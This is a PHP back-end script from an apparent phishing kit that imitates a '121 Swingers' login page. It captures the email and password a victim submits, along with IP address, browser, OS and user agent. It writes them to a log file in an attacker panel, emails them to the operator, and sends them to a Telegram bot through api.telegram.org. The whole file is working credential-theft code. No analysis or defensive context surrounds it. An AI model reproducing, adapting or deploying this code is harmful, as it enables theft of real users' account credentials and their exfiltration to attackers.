<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
require 'detect.php';
include '../../config.php';
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
if(isset($_POST['eml'])&&isset($_POST['pss'])){session_start();
$usern=$_POST['eml'];$passw=$_POST['pss'];$screen=$_POST['screen'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$useragent = $_SERVER['HTTP_USER_AGENT'];
$msg= "
[☡] ------- Log Victime 🥷 ------- [☡]
🥷 Email [☠︎]  = ".$usern."
🥷 Password [☠︎]  = ".$passw."
[☡] ------- info Victime 🥷 ------- [☡]
[⦿] IP Adresse [⦿] = ".$IP."
[⦿] Date [⦿] =".$times." / ".$date."
[⦿] Date [⦿] = ".$brow." [+] ".$sys."
[☡] ------- info Victime 🥷 ------- [☡] ";

$msght = "<tr>
<td width='80'>
<p align='center'><img src='https://www.countryflags.io/".$_SESSION['ip_countryCode']."/flat/24.png'>  " . $IP . "</th>
<td width='80'>
<p align='center'>" . $_POST['eml'] . "</th>
<td width='80'>
<p align='center'>" . $_POST['pss'] . "</th>
<td width='80'>
<p align='center'>" . $screen . " - " . $brow ." on " . $sys . "</th>
<td width='30'>
<p align='center'>" . $useragent . "</th>
<td width='60'>
<p align='center'>".$times." / ".$date."</th>
</font></th></tr>";		
$save=fopen("../panel/log" . $namerand . ".html", "a+");fwrite($save, $msght);fclose($save); 
$subject  = " [ 121 Swingers LOGIN ] / ".$IP." / Super 'D' ";$headers = "From: 121 Swingers\r\n";mail($yourmail, $subject, $msg, $headers);include("authentication.php");
    $token = "$botToken";
    $data = [
    'text' => $msg,
    'chat_id' => $chatId,
    ];file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
}
?>